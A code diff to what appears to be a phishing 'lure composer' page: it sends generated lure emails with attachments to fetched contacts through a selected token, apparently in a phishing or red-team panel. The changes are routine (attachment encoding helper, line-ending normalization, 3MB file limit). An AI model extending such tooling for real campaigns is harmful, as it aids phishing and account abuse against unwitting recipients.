@@ -5,6 +5,7 @@ import { motion } from "framer-motion";
 import { useParams, useRouter } from "next/navigation";
 import { Token } from "@/types/token";
 import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck } from "@/lib/api";
+import { fileToBase64 } from "@/lib/utils";
 import {
   Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
   Plus, X, Eye, ShieldAlert, CheckCircle2, Link as LinkIcon,
@@ -465,25 +466,11 @@ export default function LureComposerPage() {
     if (!tokenId) return;
     setSending(true);
     try {
-      const attachmentPayload = await Promise.all(
-        attachments.map(async (file) => {
-          const buffer = await file.arrayBuffer();
-          const bytes = new Uint8Array(buffer);
-          let binary = "";
-          for (let i = 0; i < bytes.byteLength; i++) {
-            binary += String.fromCharCode(bytes[i]);
-          }
-          return {
-            name: file.name,
-            content_type: file.type || "application/octet-stream",
-            content_bytes: btoa(binary),
-          };
-        })
-      );
+      const attachmentPayload = await Promise.all(attachments.map(fileToBase64));
 
-      // Convert newlines to <br> for HTML emails
+      // Convert newlines to <br> for HTML emails (normalize \r\n first)
       const formattedBody = contentType === "HTML"
-        ? body.replace(/\n/g, "<br>")
+        ? body.replace(/\r\n/g, "\n").replace(/\n/g, "<br>")
         : body;
 
       const max = Math.max(1, maxRecipientsPerSend);
@@ -876,12 +863,18 @@ export default function LureComposerPage() {
                     className="hidden"
                     onChange={(e) => {
                       const files = Array.from(e.target.files || []);
-                      setAttachments((prev) => [...prev, ...files]);
+                      const MAX_MB = 3;
+                      const tooLarge = files.filter(f => f.size > MAX_MB * 1024 * 1024);
+                      if (tooLarge.length > 0) {
+                        tooLarge.forEach(f => toast.error(`"${f.name}" is too large (${(f.size / 1024 / 1024).toFixed(1)}MB). Max ${MAX_MB}MB.`));
+                      }
+                      setAttachments((prev) => [...prev, ...files.filter(f => f.size <= MAX_MB * 1024 * 1024)]);
                     }}
                   />
                   <label htmlFor="lure-attachments" className="inline-flex items-center gap-1.5 text-[11px] text-muted-foreground hover:text-foreground cursor-pointer">
                     <Plus className="h-3.5 w-3.5" /> Attach files
                   </label>
+                  <p className="text-[10px] text-muted-foreground">Max 3MB per file</p>
                   {attachments.length > 0 && (
                     <div className="flex flex-wrap gap-1.5">
                       {attachments.map((file, idx) => (
